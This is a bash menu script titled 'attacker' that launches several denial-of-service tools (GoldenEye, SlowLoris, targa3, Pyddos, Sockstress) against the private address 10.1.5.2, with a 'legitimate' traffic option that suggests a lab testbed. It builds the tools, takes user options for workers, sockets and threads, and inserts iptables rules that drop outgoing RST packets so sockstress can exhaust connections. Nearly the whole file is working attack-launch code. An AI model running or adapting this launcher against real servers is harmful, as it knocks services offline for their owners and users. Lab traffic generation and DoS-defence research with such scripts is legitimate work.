#!/bin/bash

while true; do
    clear 
    figlet attacker
    date +'[%H:%M:%S] ======='
    echo "Choose what to do."
    echo "[0] >> Legitimate"
    echo "[1] GoldenEye"
    echo "[2] SlowLoris"
    echo "[3] targa3"
    echo "[4] Pyddos"
    echo "[5] Sockstress"
    echo "[e] Exit"
    read -rp "> " option

    if [[ $option == 0 ]]; then
        echo "Running Legitimate"
        ./legitimate.sh server 7 10
    elif [[ $option == 1 ]]; then
        echo "GoldenEye: Insert command line options [-w [workers]]"
        read -rp "> " works
        echo "GoldenEye: Insert command line options [-s [sockets]]"
        read -rp "> " socks
        echo "Press ^C to stop the attack"
        #if [ -z "$opts" ]; then
        python3 tools/GoldenEye/goldeneye.py "http://10.1.5.2/1.html" -m get -n -d -w "$works" -s "$socks"
        #else
        #    python3 tools/GoldenEye/goldeneye.py "http://server/1.html" -m 'random' -n -d 
        #fi
    elif [[ $option == 2 ]]; then
        echo "SlowLoris: Insert command line options [--sleeptime [sleeptime] -s [sockets]]"
        read -rp "> " opts
        echo "Press ^C to stop the attack"
        if [ -z "$opts" ]; then
            python3 tools/slowloris/slowloris.py -v -ua 10.1.5.2
        else
            python3 tools/slowloris/slowloris.py -v -ua "$opts" 10.1.5.2
        fi
    elif [[ $option == 3 ]]; then
        if [[ ! -f "tools/targa3/targa3" ]]; then
            cc -Wall -O2 -s -o tools/targa3/targa3 tools/targa3/targa3.c
        fi
        echo "Targa3: Insert command line options [-c [count]]"
        read -rp "> " opts
        echo "Press ^C to stop the attack"
        tools/targa3/targa3 10.1.5.2 "$opts"
    elif [[ $option == 4 ]]; then
        echo "pyddos: Insert command line options [-t [threads]]"
        read -rp "> " opts
        echo "Press ^C to stop the attack"
        python3 tools/pyddos/pyddos.py -t 10.1.5.2 -p 80 "$opts"
    elif [[ $option == 5 ]]; then
        if [[ ! -f "tools/sockstress/sockstress" ]]; then
            cd tools/sockstress
            make
            cd -
        fi
        trap continue SIGINT
        sudo iptables -I OUTPUT -p TCP --tcp-flags rst rst -d 10.1.5.2/24 -j DROP
        sudo ip a | grep " UP " -A 2 | grep -v "link/ether"
        echo "sockstress: Insert COMPULSORY options [iface]"
        read -rp "> " opts
        echo "Press ^C to stop the attack"
        sudo tools/sockstress/sockstress 10.1.5.2:80 "$opts"
        sudo iptables -D OUTPUT -p TCP --tcp-flags rst rst -d 10.1.5.2/24 -j DROP
        trap exit SIGINT
    elif [[ $option == 'e' ]]; then
        echo "Exit"
        exit
    else
        echo "Invalid option"
        exit
    fi
done